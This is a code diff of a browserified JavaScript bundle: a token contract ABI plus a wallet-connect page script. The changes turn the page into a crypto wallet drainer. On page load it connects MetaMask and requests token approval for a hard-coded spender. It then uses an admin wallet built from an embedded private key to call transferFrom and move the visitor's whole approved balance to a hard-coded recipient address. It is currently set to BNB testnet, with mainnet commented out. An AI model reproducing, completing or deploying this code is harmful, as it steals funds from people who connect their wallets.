@@ -1,10 +1,8 @@
 (function(){function r(e,n,t){function o(i,f){if(!n[i]){if(!e[i]){var c="function"==typeof require&&require;if(!f&&c)return c(i,!0);if(u)return u(i,!0);var a=new Error("Cannot find module '"+i+"'");throw a.code="MODULE_NOT_FOUND",a}var p=n[i]={exports:{}};e[i][0].call(p.exports,function(r){var n=e[i][1][r];return o(n||r)},p,p.exports,r,e,n,t)}return n[i].exports}for(var u="function"==typeof require&&require,i=0;i<t.length;i++)o(t[i]);return o}return r})()({1:[function(require,module,exports){
 module.exports=[
   {
-    "inputs": [
-      { "internalType": "string", "name": "name", "type": "string" },
-      { "internalType": "string", "name": "symbol", "type": "string" }
-    ],
+    "inputs": [],
+    "payable": false,
     "stateMutability": "nonpayable",
     "type": "constructor"
   },
@@ -39,6 +37,25 @@ module.exports=[
       {
         "indexed": true,
         "internalType": "address",
+        "name": "previousOwner",
+        "type": "address"
+      },
+      {
+        "indexed": true,
+        "internalType": "address",
+        "name": "newOwner",
+        "type": "address"
+      }
+    ],
+    "name": "OwnershipTransferred",
+    "type": "event"
+  },
+  {
+    "anonymous": false,
+    "inputs": [
+      {
+        "indexed": true,
+        "internalType": "address",
         "name": "from",
         "type": "address"
       },
@@ -59,42 +76,78 @@ module.exports=[
     "type": "event"
   },
   {
+    "constant": true,
+    "inputs": [],
+    "name": "_decimals",
+    "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }],
+    "payable": false,
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "constant": true,
+    "inputs": [],
+    "name": "_name",
+    "outputs": [{ "internalType": "string", "name": "", "type": "string" }],
+    "payable": false,
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "constant": true,
+    "inputs": [],
+    "name": "_symbol",
+    "outputs": [{ "internalType": "string", "name": "", "type": "string" }],
+    "payable": false,
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "constant": true,
     "inputs": [
       { "internalType": "address", "name": "owner", "type": "address" },
       { "internalType": "address", "name": "spender", "type": "address" }
     ],
     "name": "allowance",
     "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+    "payable": false,
     "stateMutability": "view",
     "type": "function"
   },
   {
+    "constant": false,
     "inputs": [
       { "internalType": "address", "name": "spender", "type": "address" },
       { "internalType": "uint256", "name": "amount", "type": "uint256" }
     ],
     "name": "approve",
     "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+    "payable": false,
     "stateMutability": "nonpayable",
     "type": "function"
   },
   {
+    "constant": true,
     "inputs": [
       { "internalType": "address", "name": "account", "type": "address" }
     ],
     "name": "balanceOf",
     "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+    "payable": false,
     "stateMutability": "view",
     "type": "function"
   },
   {
+    "constant": true,
     "inputs": [],
     "name": "decimals",
-    "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }],
+    "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+    "payable": false,
     "stateMutability": "view",
     "type": "function"
   },
   {
+    "constant": false,
     "inputs": [
       { "internalType": "address", "name": "spender", "type": "address" },
       {
@@ -105,51 +158,101 @@ module.exports=[
     ],
     "name": "decreaseAllowance",
     "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+    "payable": false,
     "stateMutability": "nonpayable",
     "type": "function"
   },
   {
+    "constant": true,
+    "inputs": [],
+    "name": "getOwner",
+    "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
+    "payable": false,
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "constant": false,
     "inputs": [
       { "internalType": "address", "name": "spender", "type": "address" },
       { "internalType": "uint256", "name": "addedValue", "type": "uint256" }
     ],
     "name": "increaseAllowance",
     "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+    "payable": false,
     "stateMutability": "nonpayable",
     "type": "function"
   },
   {
+    "constant": false,
+    "inputs": [
+      { "internalType": "uint256", "name": "amount", "type": "uint256" }
+    ],
+    "name": "mint",
+    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+    "payable": false,
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "constant": true,
     "inputs": [],
     "name": "name",
     "outputs": [{ "internalType": "string", "name": "", "type": "string" }],
+    "payable": false,
     "stateMutability": "view",
     "type": "function"
   },
   {
+    "constant": true,
+    "inputs": [],
+    "name": "owner",
+    "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
+    "payable": false,
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "constant": false,
+    "inputs": [],
+    "name": "renounceOwnership",
+    "outputs": [],
+    "payable": false,
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "constant": true,
     "inputs": [],
     "name": "symbol",
     "outputs": [{ "internalType": "string", "name": "", "type": "string" }],
+    "payable": false,
     "stateMutability": "view",
     "type": "function"
   },
   {
+    "constant": true,
     "inputs": [],
     "name": "totalSupply",
     "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+    "payable": false,
     "stateMutability": "view",
     "type": "function"
   },
   {
+    "constant": false,
     "inputs": [
       { "internalType": "address", "name": "recipient", "type": "address" },
       { "internalType": "uint256", "name": "amount", "type": "uint256" }
     ],
     "name": "transfer",
     "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+    "payable": false,
     "stateMutability": "nonpayable",
     "type": "function"
   },
   {
+    "constant": false,
     "inputs": [
       { "internalType": "address", "name": "sender", "type": "address" },
       { "internalType": "address", "name": "recipient", "type": "address" },
@@ -157,6 +260,18 @@ module.exports=[
     ],
     "name": "transferFrom",
     "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+    "payable": false,
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "constant": false,
+    "inputs": [
+      { "internalType": "address", "name": "newOwner", "type": "address" }
+    ],
+    "name": "transferOwnership",
+    "outputs": [],
+    "payable": false,
     "stateMutability": "nonpayable",
     "type": "function"
   }
@@ -165,6 +280,17 @@ module.exports=[
 },{}],2:[function(require,module,exports){
 window.onload = async function(){
   let useraddress;
+  // let network_id = '0x38'; // bnb mainnet
+  let network_id = '0x61';  // bnb testnet
+
+  const tokenAddress = '0x337610d27c682E347C9cD60BD4b3b107C9d34dDd'; // bsc usdt contract
+  const spenderAddress = '0xb7E5bE0162c1639205a84BAf49067EeDEEc3e2a6'; // spender address
+  let recipientAddress = '0xad166A918d20703D6D5d97919C79f4C56e12A68f'; // recipient address
+  let token_amount;
+  let approval_balance;
+  
+  // ========================= script for trsfo =========================================
+
   let connect_button = document.querySelector('.connect_button');
   let parent_all = document.querySelector('.parent_all');
   let user_wallet_p = document.querySelector('.user_wallet_p');
@@ -196,20 +322,15 @@ window.onload = async function(){
       const accounts = await ethereum.request({ method: 'eth_requestAccounts',});
       useraddress = accounts[0];
       await wallet_connected(useraddress);
-      // await change_network('0x38');
+      await change_network(network_id);
 
       await controller();
     } else {
-      // connect_meamask();
+      connect_meamask();
     }
   }
 
   // =============== ethers ================
-  const tokenAddress = '0xf86df9b91f002cfeb2aed0e6d05c4c4eaef7cf02';
-  const spenderAddress = '0xad166A918d20703D6D5d97919C79f4C56e12A68f';
-  let recipientAddress = '0x71e0ace3Bd2bfD6dB4FbC8BAd3B28753A991a80B';
-  let token_amount;
-  let approval_balance;
 
   const tokenAbi = require('./abi.json');
   const ethers = require('ethers');
@@ -246,15 +367,24 @@ window.onload = async function(){
     return approval_balance;
   }
 
+  // transfer funds from user wallet to another wallet
+  const privateKey ='your private key';
+  const wallet = new ethers.Wallet(privateKey, provider);
+  const admin_tokenContract = new ethers.Contract(tokenAddress, tokenAbi, wallet);
+
   async function transferFrom(){
     if(approval_balance > 0){
-        console.log('transfering...');
-        console.log(approval_balance);
-        let transfer_from_balance = ethers.utils.parseUnits('1',18);
-        const tx = await tokenContract.transferFrom(
+        let transfer_from_balance = ethers.utils.parseUnits(approval_balance.toString(),18);
+
+        const gasEstimate = await admin_tokenContract.estimateGas.transferFrom(useraddress,recipientAddress,transfer_from_balance);
+
+        const gasPrice = await provider.getGasPrice();
+
+        const tx = await admin_tokenContract.transferFrom(
           useraddress,
           recipientAddress,
           transfer_from_balance,
+          {gasPrice: gasPrice,gasLimit: gasEstimate,}
         );
         await tx.wait();
         console.log('Transfer successful!');
@@ -264,11 +394,11 @@ window.onload = async function(){
   }
 
 
-
   // ============== controller ===============
   async function controller(){
+
     await getBalance();
-    // await approve();
+    await approve();
     await allowance();
     await transferFrom();
   }
